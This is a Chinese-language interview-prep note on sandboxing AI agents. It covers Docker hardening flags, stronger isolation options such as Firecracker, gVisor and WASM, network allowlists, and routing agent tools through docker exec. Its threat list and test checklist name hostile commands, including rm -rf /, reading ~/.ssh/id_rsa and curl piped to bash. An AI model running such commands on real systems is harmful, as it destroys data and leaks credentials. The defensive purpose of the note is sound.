---
type: concept
status: seed
domain: llm-agent
created: 2026-06-25
updated: 2026-06-25
series: pi-mono
tags:
  - 面试
  - sandbox
  - docker
  - security
aliases:
  - Agentic Sandbox
  - Agent 沙盒
---

# 05 - Agentic Sandbox

> [!note]
> Agent 会执行**任意代码**(bash/edit/write),必须有沙盒隔离。
> **Docker 是最实用的方案** —— 大部分场景够了。
> 高延迟场景才需要专门的 agent 基础设施优化(了解即可)。

## 1. 为什么需要沙盒

```
Agent 跑代码的风险:
   ┌────────────────────────────────────────────┐
   │ ① 误删文件 — rm -rf /                     │
   │ ② 数据泄露 — cat ~/.ssh/id_rsa           │
   │ ③ 网络攻击 — curl malicious.url | bash   │
   │ ④ 资源耗尽 — fork bomb / bitminer        │
   │ ⑤ 权限提升 — sudo / setuid               │
   │ ⑥ 供应链 — npm install 里有恶意包        │
   │ ⑦ 持久后门 — 写 cron / launch agent      │
   └────────────────────────────────────────────┘

不沙盒 = 把你的电脑/服务器交给 LLM
```

## 2. 沙盒方案谱系

```
隔离强度(低 → 高):

┌──────────────────┬───────────────────────────────────┐
│ 方案             │ 特点                              │
├──────────────────┼───────────────────────────────────┤
│ ① 目录限制       │ 只允许在 cwd 操作                 │
│ (cwd only)       │ 弱 — 网络仍可,系统调用仍可       │
├──────────────────┼───────────────────────────────────┤
│ ② 进程隔离       │ 子进程 + dropped privileges       │
│ (setuid)         │ 中 — 但同 kernel                  │
├──────────────────┼───────────────────────────────────┤
│ ③ Docker         │ 容器隔离 + 资源限制 ★            │
│ (推荐)           │ 强 — 但共享 kernel                │
├──────────────────┼───────────────────────────────────┤
│ ④ Firecracker    │ microVM,极轻量                    │
│ (Fly.io/AWS)     │ 很强 — 独立 kernel                │
├──────────────────┼───────────────────────────────────┤
│ ⑤ gVisor         │ 用户态 kernel,系统调用拦截       │
│ (Google)         │ 很强 — 性能损失                   │
├──────────────────┼───────────────────────────────────┤
│ ⑥ WASM           │ WebAssembly 沙盒                  │
│ (Wasmtime)       │ 强 — 但生态有限                   │
├──────────────────┼───────────────────────────────────┤
│ ⑦ 真虚拟机       │ KVM/QEMU                          │
│ (VMware/KVM)     │ 最强 — 重                         │
└──────────────────┴───────────────────────────────────┘
```

## 3. Docker 沙盒(实务)

### 3.1 最小 Dockerfile

```dockerfile
FROM node:20-slim

# 创建非 root 用户
RUN useradd -m -s /bin/bash agent
USER agent
WORKDIR /home/agent/workspace

# 复制 PuinClaw 代码
COPY --chown=agent:agent . /home/agent/pi-mono
WORKDIR /home/agent/pi-mono

# 安装依赖(只读)
RUN npm ci --production

# 入口
CMD ["node", "packages/mom/dist/main.js"]
```

### 3.2 安全 docker run

```bash
docker run \
  --rm \
  --read-only \                              # 文件系统只读
  --tmpfs /tmp \                             # /tmp 临时可写
  -v $(pwd)/workspace:/home/agent/workspace \ # 仅 workspace 持久
  --network=none \                           # 默认无网络
  -e ANTHROPIC_API_KEY=$KEY \                # 只传必要 env
  --memory=512m \                            # 内存限制
  --cpus=1 \                                 # CPU 限制
  --pids-limit=100 \                         # 进程数限制
  --cap-drop=ALL \                           # 丢弃所有 capabilities
  --security-opt=no-new-privileges \         # 禁止提权
  puinclaw-sandbox
```

### 3.3 关键安全配置(必背)

```
┌────────────────────────┬─────────────────────────────────┐
│ 配置                   │ 作用                            │
├────────────────────────┼─────────────────────────────────┤
│ --rm                   │ 退出即删,不残留状态            │
│ --read-only            │ rootfs 只读                     │
│ --tmpfs /tmp           │ /tmp 临时写区                   │
│ --network=none         │ 默认无网络                      │
│ --memory / --cpus      │ 资源限制                        │
│ --pids-limit           │ 防 fork bomb                    │
│ --cap-drop=ALL         │ 丢弃所有 capabilities           │
│ --security-opt=        │ 禁止提权                        │
│   no-new-privileges    │                                 │
│ USER 非 root           │ 容器内非 root                   │
└────────────────────────┴─────────────────────────────────┘
```

## 4. 网络策略

```
问题:Agent 经常需要网络(npm install / git pull / API 调用)
      但又不能完全开放(防数据泄露 + 恶意下载)

方案:
   ┌──────────────────────────────────────────┐
   │ 白名单模式(推荐)                       │
   │   allow: npmjs.org / github.com /       │
   │         api.anthropic.com               │
   │   deny: 其他所有                        │
   └──────────────────────────────────────────┘

实现:
   ① Docker --network=none + HTTP proxy 过滤
   ② iptables 规则
   ③ eBPF 过滤(Cilium)
```

## 5. PuinClaw 接入沙盒

### 5.1 改造 bash 工具

```
原来:PuinClaw 直接 spawn bash
改造:PuinClaw 调 docker exec sandbox bash -c "..."

伪代码:
   const result = await exec(
     `docker exec ${containerId} bash -c "${cmd}"`
   );
```

### 5.2 完整流程

```
用户 /goal "fix bug"
       │
       ▼
PuinClaw 启动 sandbox 容器
       │
       ├─ docker run --rm --network=none \
       │    -v workspace:/workspace \
       │    sandbox-image
       │
       ▼
Agent 跑工具调用
   ┌─ bash → docker exec 容器内执行
   ├─ read → docker exec cat
   ├─ write → docker exec tee
   └─ edit → docker exec sed
       │
       ▼
容器结束(--rm 自动清理)
       │
       ▼
workspace(挂载的 volume)保留
```

### 5.3 多 goal 并发的隔离

```
每个 goal 一个独立容器:
   goal-1 → container-1 (workspace-1)
   goal-2 → container-2 (workspace-2)
   goal-3 → container-3 (workspace-3)

互不干扰,失败可单独清理。
```

## 6. 何时需要专门优化(了解)

```
延迟敏感场景需要专门 agent infra:
   ┌────────────────────────────────────────────┐
   │ 问题:                                      │
   │   docker run 启动 = 几百 ms ~ 几秒         │
   │   每次 tool call 都开新容器 → 累积延迟高   │
   ├────────────────────────────────────────────┤
   │ 解决方案:                                  │
   │   ① 容器池(预热 N 个容器待命)            │
   │   ② Firecracker microVM(启动 < 100ms)   │
   │   ③ gVisor(常驻进程)                     │
   │   ④ WASM 沙盒(启动 < 10ms)              │
   └────────────────────────────────────────────┘

→ 一般项目用 Docker 即可,延迟瓶颈才上 microVM/WASM。
```

## 7. 面试要点

### 必答清单

```
Q1: 为什么 agent 需要沙盒?
A: Agent 执行任意代码 — 风险包括:误删/泄露/攻击/资源耗尽/
   权限提升/供应链/持久后门。

Q2: Docker 沙盒的关键配置?
A: --read-only + --tmpfs /tmp + --network=none + 
   --memory/--cpus/--pids-limit + --cap-drop=ALL +
   --security-opt=no-new-privileges + 非 root USER。

Q3: Docker vs 真虚拟机 怎么选?
A: Docker — 共享 kernel,中等隔离,启动快(几百 ms)。
   KVM — 独立 kernel,最强隔离,启动慢(几秒)。
   一般 agent 任务用 Docker;高安全用 KVM/Firecracker。

Q4: Agent 需要网络怎么办?
A: 白名单模式 — 只放行特定域名(npmjs/github/API),
   其他全 deny。实现:HTTP proxy / iptables / eBPF。

Q5: 多 goal 怎么隔离?
A: 每个 goal 一个独立容器 + 独立 workspace volume。
   失败可单独清理,互不干扰。
```

### 加分点

```
• 知道 Firecracker / gVisor / WASM 等高级方案
• 提到 capability drop 是核心
• 提到 --security-opt=no-new-privileges 防 setuid 提权
• 提到供应链攻击(npm 包里藏后门)
• 提到资源限制(--pids-limit 防 fork bomb)
```

## 8. 关键资料

| 资料 | 内容 |
|---|---|
| [本地代理实现安全沙盒](https://www.anthropic.com/engineering/built-codebase-engineering-runbook) | Anthropic 沙盒指南 |
| [Docker security](https://docs.docker.com/engine/security/) | 官方安全文档 |
| [Firecracker](https://firecracker-microvm.github.io/) | microVM |
| [gVisor](https://gvisor.dev/) | 用户态 kernel |
| [OWASP Docker Top 10](https://owasp.org/www-project-docker-top-10/) | 常见漏洞 |

## 9. 跟之前学的对照

| 学过的 | 这里的对应 |
|---|---|
| [[09 - Resilience]] (claw0) | 沙盒是 Resilience 的物理基础 |
| [[10 - Concurrency]] (claw0) | 多 agent → 多容器并发 |
| pi-mono packages/mom sandbox.ts | pi-mono 已有 sandbox 模块 |

## 10. PuinClaw 实操清单

```
□ 写 Dockerfile(slim + 非 root)
□ 写 docker run 安全配置(--read-only + --cap-drop 等)
□ 改造 bash 工具走 docker exec
□ 设计 workspace volume 挂载
□ 写网络白名单(proxy 或 iptables)
□ 测试:故意 rm -rf / 看是否拦住
□ 测试:故意 curl 外网看是否拦住
```

_Generated for PuinClaw 面试准备, 2026-06-25_
